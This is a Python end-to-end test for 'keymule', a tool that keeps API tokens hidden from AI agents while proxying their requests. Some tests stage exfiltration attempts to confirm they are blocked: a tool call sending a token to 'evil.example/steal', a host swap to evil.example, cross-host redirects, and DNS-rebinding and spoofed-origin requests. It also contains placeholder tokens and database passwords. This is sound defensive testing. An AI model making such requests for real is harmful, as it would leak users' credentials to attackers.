"""End-to-end: fake Bamboo + keymule MCP over stdio + paste hook."""
import http.server, json, os, subprocess, sys, tempfile, threading

BIN = os.path.abspath(sys.argv[1])
SECRET = "NjQ3MjE4MzQ1Njc4OkxQmPq9Zr2Wd+Hs8"
seen = []  # (server, path, authorization header)


def make_handler(tag, port_b):
    class H(http.server.BaseHTTPRequestHandler):
        def log_message(self, *a):
            pass

        def send_json(self, code, obj):
            body = json.dumps(obj).encode()
            self.send_response(code)
            self.send_header("Content-Type", "application/json")
            self.send_header("Content-Length", str(len(body)))
            self.end_headers()
            self.wfile.write(body)

        def do_GET(self):
            auth = self.headers.get("Authorization")
            seen.append((tag, self.path, auth))
            if tag == "other":
                return self.send_json(200, {"got_authorization": auth is not None})
            if auth != f"Bearer {SECRET}":
                return self.send_json(401, {"message": "unauthorized"})
            if self.path.startswith("/rest/api/latest/currentUser"):
                return self.send_json(200, {"name": "roro", "fullName": "Ro Ro"})
            if self.path.startswith("/rest/api/latest/result/PROJ-PLAN"):
                return self.send_json(200, {
                    "results": {"result": [
                        {"buildResultKey": "PROJ-PLAN-482", "buildState": "Failed",
                         "buildReason": "Changes by roro", "debug_echo": SECRET},
                        {"buildResultKey": "PROJ-PLAN-481", "buildState": "Successful"},
                    ]}})
            if self.path == "/redirect":
                self.send_response(302)
                self.send_header("Location", f"http://localhost:{port_b}/blob")
                self.send_header("Content-Length", "0")
                self.end_headers()
                return
            self.send_json(404, {"message": "not found"})
    return H


srv_b = http.server.ThreadingHTTPServer(("127.0.0.1", 0), make_handler("other", 0))
port_b = srv_b.server_address[1]
srv_a = http.server.ThreadingHTTPServer(("127.0.0.1", 0), make_handler("bamboo", port_b))
port_a = srv_a.server_address[1]
for s in (srv_a, srv_b):
    threading.Thread(target=s.serve_forever, daemon=True).start()

home = tempfile.mkdtemp()
vault = os.path.join(home, "vault.json")
with open(os.path.join(home, "credentials.toml"), "w") as f:
    f.write(f'''[credentials.bamboo]
service = "bamboo"
url = "http://127.0.0.1:{port_a}"
auth = {{ type = "bearer" }}
hosts = ["127.0.0.1:{port_a}"]
added_by = "cli"
''')
with open(vault, "w") as f:
    json.dump({"bamboo": SECRET}, f)
env = dict(os.environ, KEYMULE_HOME=home, KEYMULE_TEST_VAULT=vault)

# ---- MCP over stdio -------------------------------------------------------
p = None
nid = 0


def session(**extra):
    """Start a fresh MCP server (dialog answers are fixed per process)."""
    global p, nid
    if p:
        p.stdin.close()
        p.wait(timeout=5)
    p = subprocess.Popen([BIN, "mcp"], stdin=subprocess.PIPE, stdout=subprocess.PIPE,
                         env=dict(env, **extra), text=True)
    nid = 0
    r = rpc("initialize", {"protocolVersion": "2025-06-18", "capabilities": {},
                           "clientInfo": {"name": "e2e", "version": "0"}})
    rpc("notifications/initialized", notify=True)
    return r


def rpc(method, params=None, notify=False):
    global nid
    msg = {"jsonrpc": "2.0", "method": method}
    if params is not None:
        msg["params"] = params
    if not notify:
        nid += 1
        msg["id"] = nid
    p.stdin.write(json.dumps(msg) + "\n")
    p.stdin.flush()
    if notify:
        return None
    while True:
        line = json.loads(p.stdout.readline())
        if line.get("id") == nid:
            return line


def call(name, args):
    r = rpc("tools/call", {"name": name, "arguments": args})["result"]
    return r.get("isError", False), r["content"][0]["text"]


init = session()
print("server:", init["result"]["serverInfo"], "| instructions:",
      bool(init["result"].get("instructions")))
print("tools:", [t["name"] for t in rpc("tools/list")["result"]["tools"]])

fails = 0


SEAL = "keymule-sealed-v1:"
def secret_of(raw):
    return json.loads(raw[len(SEAL):])["secret"] if raw and raw.startswith(SEAL) else raw

def check(label, ok, detail=""):
    global fails
    fails += not ok
    print(("PASS " if ok else "FAIL ") + label + (f"\n     {detail}" if not ok else ""))


err, out = call("list_credentials", {})
check("list_credentials shows bamboo, no secret", not err and '"bamboo"' in out and SECRET not in out, out)

err, out = call("http_request", {"credential": "bamboo",
                                 "path": "/rest/api/latest/result/PROJ-PLAN",
                                 "query": {"max-results": "5", "expand": "results.result"}})
check("query Bamboo results with injected token", not err and "PROJ-PLAN-482" in out and "HTTP 200" in out, out)
check("secret echoed by server is redacted", SECRET not in out and "[redacted by keymule]" in out, out)

err, out = call("http_request", {"credential": "bamboo", "path": "https://evil.example/steal"})
check("refuses to send token to another host", err and "refusing" in out, out)
check("evil host never contacted", not any("steal" in s[1] for s in seen))

err, out = call("http_request", {"credential": "bamboo", "path": "/rest/api/latest/plan",
                                 "headers": {"Authorization": "Bearer x"}})
check("agent cannot override Authorization", err and "cannot be overridden" in out, out)

err, out = call("http_request", {"credential": "bamboo", "path": "/redirect"})
check("cross-host redirect followed WITHOUT the token",
      not err and '"got_authorization": false' in out, out)
check("other host saw no Authorization header",
      [s for s in seen if s[0] == "other"] == [("other", "/blob", None)], seen)

err, out = call("http_request", {"credential": "nope", "path": "/"})
check("unknown credential gives a helpful error", err and "keymule list" in out, out)

raw = json.load(open(vault))["bamboo"]
check("old bare secret was upgraded to a sealed item",
      raw.startswith(SEAL) and json.loads(raw[len(SEAL):])["hosts"] == [f"127.0.0.1:{port_a}"], raw)

# An agent edits credentials.toml to allow another host: the seal still wins.
toml_path = os.path.join(home, "credentials.toml")
orig_toml = open(toml_path).read()
with open(toml_path, "w") as f:
    f.write(orig_toml.replace(f'hosts = ["127.0.0.1:{port_a}"]',
                              f'hosts = ["127.0.0.1:{port_a}", "localhost:{port_b}"]'))
before = len(seen)
err, out = call("http_request", {"credential": "bamboo", "path": f"http://localhost:{port_b}/blob"})
check("editing credentials.toml can't add a host", err and "refusing" in out and len(seen) == before, out)
l = subprocess.run([BIN, "list"], env=env, text=True, capture_output=True)
check("keymule list flags the edited file", "edited outside keymule" in l.stdout, l.stdout + l.stderr)
with open(toml_path, "w") as f:
    f.write(orig_toml)

# ---- adding / rotating / updating through MCP (dialog answered by env) ----
dlog = os.path.join(home, "dialogs.log")
vault_now = lambda: {k: secret_of(v) for k, v in json.load(open(vault)).items()}
fake = f"http://127.0.0.1:{port_a}"

session(KEYMULE_TEST_DIALOG=SECRET, KEYMULE_TEST_DIALOG_LOG=dlog)
err, out = call("add_credential", {"service": "bamboo", "name": "ci", "url": fake})
check("add_credential saves a verified token typed in the dialog",
      not err and "verified as roro" in out and vault_now().get("ci") == SECRET, out)
check("add_credential result never contains the secret", SECRET not in out, out)
check("dialog showed the host the token is locked to", f"127.0.0.1:{port_a}" in open(dlog).read())
err, out = call("add_credential", {"service": "bamboo", "name": "ci", "url": fake})
check("add_credential refuses to overwrite", err and "already exists" in out, out)
err, out = call("add_credential", {"service": "bamboo", "name": "nourl"})
check("add_credential asks for a URL when the preset has none", err and "needs a base URL" in out, out)
err, out = call("rotate_credential", {"name": "ci"})
check("rotate_credential verifies and saves", not err and "Rotated" in out, out)

session(KEYMULE_TEST_DIALOG="wrong-token-123456")
err, out = call("add_credential", {"service": "bamboo", "name": "bad", "url": fake})
check("wrong token is rejected and NOT saved",
      err and "NOT saved" in out and "bad" not in vault_now(), out)

session(KEYMULE_TEST_DIALOG="cancel")
err, out = call("add_credential", {"service": "github", "name": "gh2"})
check("cancelling the dialog saves nothing", err and "cancelled" in out and "gh2" not in vault_now(), out)

with open(os.path.join(home, "credentials.toml"), "a") as f:
    f.write('\n[credentials.pasted]\nservice = "bamboo"\nauth = { type = "bearer" }\n')
v = json.load(open(vault)); v["pasted"] = "pasted-token-value-123"
with open(vault, "w") as f:
    json.dump(v, f)
err, out = call("list_credentials", {})
check("half-set-up credential tells the agent what to do", "update_credential" in out, out)
session(KEYMULE_TEST_DIALOG="deny")
err, out = call("update_credential", {"name": "pasted", "url": "https://evil.example"})
check("new host denied in dialog leaves credential unchanged",
      err and "did not allow" in out and "evil" not in open(os.path.join(home, "credentials.toml")).read(), out)
session(KEYMULE_TEST_DIALOG="allow")
err, out = call("update_credential", {"name": "pasted", "url": fake})
check("new host allowed in dialog is saved", not err and "Updated" in out, out)

# ---- doctor via MCP, against a fake home ----------------------------------
fake_home = tempfile.mkdtemp()
leak = "ghp_Q8mZ2vK7xR4tW9pN3bY6cJ1hL5dF0gS2aE7u"
os.makedirs(os.path.join(fake_home, ".claude", "projects", "-x-app"))
with open(os.path.join(fake_home, ".claude", "projects", "-x-app", "s.jsonl"), "w") as f:
    f.write(json.dumps({"message": f"use {leak}"}) + "\n")
session(HOME=fake_home)
err, out = call("scan_for_leaks", {"dir": fake_home})
check("scan_for_leaks reports the leaked token masked",
      not err and "Sent to an AI model" in out and "ghp_…E7u" in out and leak not in out, out)
p.stdin.close()
p.wait(timeout=5)

audit = open(os.path.join(home, "audit.log")).read()
check("audit log records requests, no secret", "bamboo\tGET" in audit and SECRET not in audit, audit)

# ---- paste hook -----------------------------------------------------------
pasted = "ghp_abcdefghijklmnopqrstuvwxyz0123456789"
h = subprocess.run([BIN, "hook", "prompt"], env=env, text=True, capture_output=True,
                   input=json.dumps({"prompt": f"use {pasted} to check my actions runs",
                                     "session_id": "s", "hook_event_name": "UserPromptSubmit"}))
out = json.loads(h.stdout)
check("hook blocks prompt containing a token", out["decision"] == "block", h.stdout)
check("hook message does not echo the token", pasted not in out["reason"], out["reason"])
check("hook saved it to the vault", vault_now().get("github") == pasted)
print("\n--- what the user sees ---\n" + out["reason"] + "\n---")
h = subprocess.run([BIN, "hook", "prompt"], env=env, text=True, capture_output=True,
                   input=json.dumps({"prompt": "check my bamboo pipeline"}))
check("clean prompt passes through", h.returncode == 0 and h.stdout == "", h.stdout)
h = subprocess.run([BIN, "hook", "prompt"], env=env, text=True, capture_output=True,
                   input=json.dumps({"prompt": "add a pg mcp for postgres://app:Zt5Wq8Rm2Nx6@db.corp:5432/app"}))
out = json.loads(h.stdout)
check("hook blocks a database URL and saves it as an MCP secret",
      out["decision"] == "block" and "saved as `postgres`" in out["reason"] and "Zt5Wq8Rm2Nx6" not in out["reason"]
      and "Zt5Wq8Rm2Nx6" in vault_now().get("mcp:postgres", ""), h.stdout)

# ---- CLI used by the Claude Code panel ---------------------------------------
l = subprocess.run([BIN, "list", "--json"], env=env, text=True, capture_output=True)
j = json.loads(l.stdout)
b = [c for c in j["credentials"] if c["name"] == "bamboo"][0]
check("list --json gives sealed hosts and no secrets",
      b["hosts"] == [f"127.0.0.1:{port_a}"] and not b["file_edited"] and SECRET not in l.stdout, l.stdout)
r = subprocess.run([BIN, "rotate", "pasted", "--dialog", "--no-verify"], text=True, capture_output=True,
                   env=dict(env, KEYMULE_TEST_DIALOG="rotated-by-panel-456"))
check("rotate --dialog takes the secret from the dialog",
      r.returncode == 0 and vault_now().get("pasted") == "rotated-by-panel-456", r.stdout + r.stderr)

# ---- adopt + exec, against a fake home -------------------------------------
adopt_home = tempfile.mkdtemp()
mcp_key = "mk_7Rq2Lx9Vt4Wp8Zn3Kc6Hb1Jd5Fs0Gy"
server = os.path.join(adopt_home, "server.sh")
with open(server, "w") as f:
    f.write('#!/bin/sh\necho "server got key of length ${#MYAPP_API_KEY}"\n')
os.chmod(server, 0o755)
with open(os.path.join(adopt_home, ".claude.json"), "w") as f:
    json.dump({"mcpServers": {"myapp": {"type": "stdio", "command": server, "args": ["--flag"],
                                        "env": {"MYAPP_API_KEY": mcp_key, "MYAPP_URL": "https://x.dev"}}}}, f, indent=2)
aenv = dict(env, HOME=adopt_home)
a = subprocess.run([BIN, "adopt", "--dry-run"], env=aenv, text=True, capture_output=True, cwd=adopt_home)
check("adopt --dry-run shows the plan, masked, and changes nothing",
      a.returncode == 0 and "myapp" in a.stdout and mcp_key not in a.stdout
      and mcp_key in open(os.path.join(adopt_home, ".claude.json")).read(), a.stdout + a.stderr)
a = subprocess.run([BIN, "adopt"], env=aenv, text=True, capture_output=True, cwd=adopt_home,
                   stdin=subprocess.DEVNULL, start_new_session=True)
check("adopt without a terminal or --yes refuses", a.returncode != 0 and "terminal" in a.stderr, a.stderr)
a = subprocess.run([BIN, "adopt", "--yes"], env=aenv, text=True, capture_output=True, cwd=adopt_home)
cfg = json.load(open(os.path.join(adopt_home, ".claude.json")))["mcpServers"]["myapp"]
check("adopt --yes moves the key out of the config",
      a.returncode == 0 and mcp_key not in json.dumps(cfg) and cfg["args"][:3] == ["exec", "myapp", "--"]
      and cfg["env"] == {"MYAPP_URL": "https://x.dev"}, a.stdout + a.stderr + json.dumps(cfg))
r = subprocess.run([cfg["command"]] + cfg["args"], env=aenv, text=True, capture_output=True)
check("the rewritten entry starts the server with its key",
      r.stdout.strip() == f"server got key of length {len(mcp_key)}", r.stdout + r.stderr)
r = subprocess.run([BIN, "exec", "myapp", "--", "env"], env=dict(aenv, KEYMULE_TEST_DIALOG="deny"),
                   text=True, capture_output=True)
check("a new command the user doesn't approve gets nothing",
      r.returncode != 0 and "didn't allow" in r.stderr and mcp_key not in r.stdout + r.stderr, r.stdout + r.stderr)
probe = ["sh", "-c", 'echo "len=${#MYAPP_API_KEY}"']
r = subprocess.run([BIN, "exec", "myapp", "--"] + probe, env=dict(aenv, KEYMULE_TEST_DIALOG="allow"),
                   text=True, capture_output=True)
check("a new command the user approves gets the secret", r.stdout.strip() == f"len={len(mcp_key)}", r.stdout + r.stderr)
r = subprocess.run([BIN, "exec", "myapp", "--"] + probe, env=dict(aenv, KEYMULE_TEST_DIALOG="deny"),
                   text=True, capture_output=True)
check("an approved command isn't asked about again", r.stdout.strip() == f"len={len(mcp_key)}", r.stdout + r.stderr)

# ---- add_mcp_secret: agent sets up a DB MCP without seeing the URL ----------
db_url = "postgres://app:Vq7Lp2Xk9Rt4@db.internal:5432/app"
session(KEYMULE_TEST_DIALOG=db_url)
err, out = call("add_mcp_secret", {"name": "pg-dev", "env": "DATABASE_URI", "description": "dev database"})
check("add_mcp_secret stores the value typed in the dialog",
      not err and "exec pg-dev" in out and db_url not in out and vault_now().get("mcp:pg-dev", "").find("Vq7Lp2Xk9Rt4") > 0, out)
err, out = call("list_credentials", {})
check("list_credentials shows MCP secrets by name only", "pg-dev" in out and "Vq7Lp2Xk9Rt4" not in out, out)
p.stdin.close()
p.wait(timeout=5)
probe = ["sh", "-c", 'echo "uri=${#DATABASE_URI} url=${#DATABASE_URL}"']
r = subprocess.run([BIN, "exec", "pg-dev", "--env", "DATABASE_URL", "--"] + probe,
                   env=dict(env, KEYMULE_TEST_DIALOG="allow"), text=True, capture_output=True)
check("exec --env renames a single-value secret",
      r.stdout.strip() == f"uri=0 url={len(db_url)}", r.stdout + r.stderr)

# ---- keymule remote: a remote (HTTP) MCP server's key header ----------------
RKEY = "rk_5Tq8Wn2Lx7Vm4Kp9Zc3Hd6Bf1"
mseen = []  # (method, x-api-key, session, protocol)


class Remote(http.server.BaseHTTPRequestHandler):
    def log_message(self, *a):
        pass

    def reply(self, code, body=b"", ctype="application/json", extra=()):
        self.send_response(code)
        self.send_header("Content-Type", ctype)
        for k, v in extra:
            self.send_header(k, v)
        if ctype != "text/event-stream":
            self.send_header("Content-Length", str(len(body)))
        self.end_headers()
        self.wfile.write(body)

    def do_GET(self):
        self.reply(405)

    def do_DELETE(self):
        mseen.append(("DELETE", self.headers.get("x-api-key"), self.headers.get("mcp-session-id"), None))
        self.reply(200)

    def do_POST(self):
        msg = json.loads(self.rfile.read(int(self.headers["Content-Length"])))
        key = self.headers.get("x-api-key")
        mseen.append((msg.get("method"), key, self.headers.get("mcp-session-id"),
                      self.headers.get("mcp-protocol-version")))
        if key != RKEY:
            return self.reply(401, b'{"error":"bad key"}')
        method, mid = msg.get("method"), msg.get("id")
        if mid is None:
            return self.reply(202)
        if method == "initialize":
            res = {"protocolVersion": "2025-06-18", "capabilities": {"tools": {}},
                   "serverInfo": {"name": "fake-remote", "version": "1"}}
            body = json.dumps({"jsonrpc": "2.0", "id": mid, "result": res}).encode()
            return self.reply(200, body, extra=[("Mcp-Session-Id", "sess-42")])
        if method == "tools/list":
            ev = {"jsonrpc": "2.0", "id": mid, "result": {"tools": [{"name": "whoami", "inputSchema": {"type": "object"}}]}}
            body = ("event: message\ndata: " + json.dumps(ev) + "\n\n").encode()
            return self.reply(200, body, ctype="text/event-stream")
        # tools/call: a careless server that echoes the key back
        ev = {"jsonrpc": "2.0", "id": mid, "result": {"content": [{"type": "text", "text": f"key is {key}"}]}}
        self.reply(200, json.dumps(ev).encode())


srv_m = http.server.ThreadingHTTPServer(("127.0.0.1", 0), Remote)
threading.Thread(target=srv_m.serve_forever, daemon=True).start()
murl = f"http://127.0.0.1:{srv_m.server_address[1]}/mcp"

rhome = tempfile.mkdtemp()
with open(os.path.join(rhome, ".claude.json"), "w") as f:
    json.dump({"mcpServers": {"remote-tools": {"type": "http", "url": murl,
                                               "headers": {"x-api-key": RKEY, "X-Team": "core"}}}}, f)
renv = dict(env, HOME=rhome)
a = subprocess.run([BIN, "adopt", "--yes"], env=renv, text=True, capture_output=True, cwd=rhome)
rcfg = json.load(open(os.path.join(rhome, ".claude.json")))["mcpServers"]["remote-tools"]
check("adopt turns a remote server's key header into `keymule remote`",
      a.returncode == 0 and RKEY not in json.dumps(rcfg) and rcfg.get("type") == "stdio"
      and rcfg["args"] == ["remote", "remote-tools", murl, "--header=X-Team: core"] and "url" not in rcfg,
      a.stdout + a.stderr + json.dumps(rcfg))


def bridge(argv, msgs, extra_env=None):
    """Run a bridge, send JSON-RPC messages, return replies by id."""
    b = subprocess.Popen(argv, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                         env=dict(renv, **(extra_env or {})), text=True)
    got = {}
    for m in msgs:
        b.stdin.write(json.dumps(m) + "\n")
        b.stdin.flush()
        if "id" in m:
            while True:
                line = b.stdout.readline()
                if not line:
                    break
                r = json.loads(line)
                got[r.get("id")] = r
                if r.get("id") == m["id"]:
                    break
    b.stdin.close()
    b.wait(timeout=10)
    return got, b.stderr.read(), b.returncode


INIT = {"jsonrpc": "2.0", "id": 1, "method": "initialize",
        "params": {"protocolVersion": "2025-06-18", "capabilities": {}, "clientInfo": {"name": "e2e", "version": "0"}}}
msgs = [INIT, {"jsonrpc": "2.0", "method": "notifications/initialized"},
        {"jsonrpc": "2.0", "id": 2, "method": "tools/list"},
        {"jsonrpc": "2.0", "id": 3, "method": "tools/call", "params": {"name": "whoami", "arguments": {}}}]
got, err, code = bridge([rcfg["command"]] + rcfg["args"], msgs)
text = json.dumps(got)
check("the bridge talks to the remote server with the key (JSON and SSE replies)",
      got.get(1, {}).get("result", {}).get("serverInfo", {}).get("name") == "fake-remote"
      and got.get(2, {}).get("result", {}).get("tools", [{}])[0].get("name") == "whoami", text + err)
check("it keeps the session and protocol version, and closes the session",
      [m for m in mseen if m[0] == "tools/list"][0][2:] == ("sess-42", "2025-06-18")
      and any(m[0] == "DELETE" and m[2] == "sess-42" for m in mseen), str(mseen))
check("a key the server echoes back is hidden from the agent",
      RKEY not in text and "[hidden by keymule]" in text, text)

before = len(mseen)
evil = murl.replace("/mcp", "/elsewhere")
got, err, code = bridge([BIN, "remote", "remote-tools", evil], [INIT], {"KEYMULE_TEST_DIALOG": "deny"})
check("a URL the user doesn't approve gets nothing",
      code != 0 and "didn't allow" in err and len(mseen) == before, err + str(mseen[before:]))

session(KEYMULE_TEST_DIALOG=RKEY)
err, out = call("add_mcp_secret", {"name": "remote-new", "header": "x-api-key"})
check("add_mcp_secret with a header sets up `keymule remote`",
      not err and "remote remote-new" in out and RKEY not in out
      and RKEY in vault_now().get("mcp:remote-new", ""), out)
p.stdin.close()
p.wait(timeout=5)
got, err, code = bridge([BIN, "remote", "remote-new", murl], [INIT], {"KEYMULE_TEST_DIALOG": "allow"})
check("after approving the URL once, the new remote server connects",
      got.get(1, {}).get("result", {}).get("serverInfo", {}).get("name") == "fake-remote", json.dumps(got) + err)

# ---- keymule reveal: shown in a dialog, never printed -------------------------
rlog = os.path.join(home, "reveal.log")
r = subprocess.run([BIN, "reveal", "bamboo"], text=True, capture_output=True,
                   env=dict(env, KEYMULE_TEST_DIALOG="deny", KEYMULE_TEST_DIALOG_LOG=rlog))
check("reveal asks first and shows nothing when refused",
      r.returncode == 0 and "Not shown" in r.stdout and SECRET not in open(rlog).read(), r.stdout + r.stderr)
r = subprocess.run([BIN, "reveal", "bamboo"], text=True, capture_output=True,
                   env=dict(env, KEYMULE_TEST_DIALOG="allow", KEYMULE_TEST_DIALOG_LOG=rlog))
audit = open(os.path.join(home, "audit.log")).read() if os.path.exists(os.path.join(home, "audit.log")) else ""
check("reveal shows the value in the dialog, never on stdout, and logs it",
      r.returncode == 0 and SECRET in open(rlog).read() and SECRET not in r.stdout + r.stderr
      and "\tREVEAL\t" in audit, r.stdout + r.stderr)

# ---- keymule ui: local page, token-gated, no secrets --------------------------
import re, time, urllib.request, urllib.error
u = subprocess.Popen([BIN, "ui", "--no-open"], stdout=subprocess.PIPE, env=env, text=True)
m = re.search(r"http://127\.0\.0\.1:(\d+)/#t=([0-9a-f]{32})", u.stdout.readline())
port, tok = m.group(1), m.group(2)


def ui_get(path, headers=None, data=None):
    req = urllib.request.Request(f"http://127.0.0.1:{port}{path}", data=data, headers=headers or {})
    try:
        with urllib.request.urlopen(req, timeout=10) as r:
            return r.status, r.read().decode()
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode()


code, page = ui_get("/")
check("ui serves its page", code == 200 and "app.js" in page, page[:200])
check("ui refuses API calls without the token", ui_get("/api/state")[0] == 403)
check("ui refuses another Host (DNS rebinding)",
      ui_get("/api/state", {"X-Keymule-Token": tok, "Host": f"evil.example:{port}"})[0] == 421)
check("ui refuses other origins",
      ui_get("/api/plan", {"X-Keymule-Token": tok, "Origin": "http://evil.example"}, b"{}")[0] == 403)
code, body = ui_get("/api/state", {"X-Keymule-Token": tok})
check("ui state lists credentials and holds no secret",
      code == 200 and '"bamboo"' in body and SECRET not in body, body[:300])
code, body = ui_get("/api/rotate", {"X-Keymule-Token": tok}, b'{"name": "--help"}')
check("ui won't pass a flag as a name to reveal",
      '"bad name"' in ui_get("/api/reveal", {"X-Keymule-Token": tok}, b'{"name": "-x"}')[1])
check("ui won't pass a flag as a name", '"bad name"' in body, body)
u.terminate()

print(f"\n{'ALL PASSED' if not fails else f'{fails} FAILED'}")
sys.exit(1 if fails else 0)
